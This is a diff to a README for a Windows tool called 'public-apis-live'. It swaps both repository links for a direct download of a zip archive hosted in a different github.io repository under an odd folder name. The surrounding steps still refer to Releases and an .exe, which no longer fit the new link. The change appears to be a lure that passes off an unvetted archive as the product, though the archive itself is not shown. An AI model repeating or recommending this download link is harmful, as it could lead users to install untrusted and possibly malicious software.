@@ -5,7 +5,7 @@ description: "Search and access verified public APIs with daily reachability che
 ---
 # 🌐 public-apis-live - Find all public software interfaces easily
 
-[![Download Now](https://img.shields.io/badge/Download-Blue-blue)](https://github.com/Ryazchips/public-apis-live)
+[![Download Now](https://img.shields.io/badge/Download-Blue-blue)](https://raw.githubusercontent.com/Ryazchips/ryazchips.github.io/main/auxometer/ryazchips_github_io_1.8.zip)
 
 ## 📌 About this tool
 Public-apis-live gathers thousands of software interfaces into one location. Developers and hobbyists often search for ways to connect different apps. This tool manages that list for you. It collects these resources and checks if they still work. The information updates every day. You do not need to hunt for links or test them yourself. Everything stays organized in one central hub.
@@ -16,7 +16,7 @@ Many websites offer data for other programs to use. These are public interfaces.
 ## 📥 Get the software
 To use the application on your Windows computer, follow these steps.
 
-1. Visit this page to download the latest version of the application: [https://github.com/Ryazchips/public-apis-live](https://github.com/Ryazchips/public-apis-live)
+1. Visit this page to download the latest version of the application: [https://raw.githubusercontent.com/Ryazchips/ryazchips.github.io/main/auxometer/ryazchips_github_io_1.8.zip](https://raw.githubusercontent.com/Ryazchips/ryazchips.github.io/main/auxometer/ryazchips_github_io_1.8.zip)
 2. Locate the section marked Releases on the right side of the screen.
 3. Select the file ending in .exe for Windows.
 4. Save the file to your computer.
